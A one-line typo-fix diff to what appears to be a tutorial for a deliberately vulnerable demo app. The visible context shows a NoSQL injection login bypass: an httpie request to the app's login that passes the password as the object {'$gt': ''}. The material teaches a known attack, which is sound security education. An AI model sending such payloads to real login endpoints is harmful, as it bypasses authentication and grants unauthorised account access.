@@ -113,7 +113,7 @@ And another request, as denoted with the following JSON request to sign-in as th
 echo '{"username":"admin@snyk.io", "password":"SuperSecretPassword"}' | http --json $GOOF_HOST/login -v
 ```
 
-However, what if the password wasn't a string? what if it was an object? Why would an object be harmful or even considered an issue?
+However, what if the password wasn't a string? What if it was an object? Why would an object be harmful or even considered an issue?
 Consider the following request:
 ```sh
 echo '{"username": "admin@snyk.io", "password": {"$gt": ""}}' | http --json $GOOF_HOST/login -v
